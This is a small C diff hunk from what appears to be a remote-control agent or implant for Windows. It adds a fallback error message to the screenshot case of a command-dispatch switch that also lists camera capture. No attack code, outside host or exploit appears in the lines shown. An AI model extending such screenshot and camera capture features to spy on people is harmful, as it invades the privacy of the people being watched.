@@ -316,6 +316,9 @@ DWORD WINAPI capability_execution_thread(LPVOID arg) {
             break;
         case CMD_SCREENSHOT:
             output = start_screenshot();
+            if (!output) {
+                output = strdup("failed to capture screenshot");
+            }
             break;
         case CMD_CAMERA_CAPTURE:
             output = start_camera_capture();
